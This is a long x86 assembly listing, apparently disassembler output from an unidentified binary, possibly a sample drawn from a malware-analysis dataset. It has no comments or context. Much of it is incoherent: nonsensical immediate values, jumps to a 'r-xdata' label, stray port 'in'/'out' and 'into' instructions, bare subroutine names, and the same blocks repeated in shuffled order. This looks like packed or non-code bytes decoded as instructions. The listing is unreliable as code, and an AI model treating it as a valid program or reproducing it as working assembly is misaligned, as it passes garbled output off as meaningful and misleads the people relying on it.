mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402657
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85ba570
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_402664
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc0099c35
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e2a
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c33601
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe2499ee
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4b8aa
jg r-xdata
jge 0x18aac1f
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec1688e
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc646b83
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402664
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff82029fc6
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85ba570
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_402664
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18aac1f
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e2a
jne r-xdata
jpe 0x18c33601
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec1688e
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4b8aa
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
jg r-xdata
jge 0xffffffffc0099c35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe2499ee
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc646b83
mov eax 0xff64870f
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_402695
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec14644
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85ba570
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18aac1f
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1000e2a
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_402664
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c33601
call 0xffffffffcec1688e
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4b8aa
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc0099c35
mov eax 0xff64870f
jg r-xdata
jl 0xe2499ee
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc646b83
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_402714
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1e963
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jpo 0x36287f5c
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287fac
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9b01
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_402741
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120aa5a
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcaa33
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e963
ja r-xdata
jmp 0xffffffffe7287fac
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f5c
jno r-xdata
jno 0xffffffffff13af8c
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f16
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9b01
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aabd
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_402791
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e963
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f5c
jg r-xdata
jge 0xffffffffe1c13f16
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287fac
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13af8c
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100aabd
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
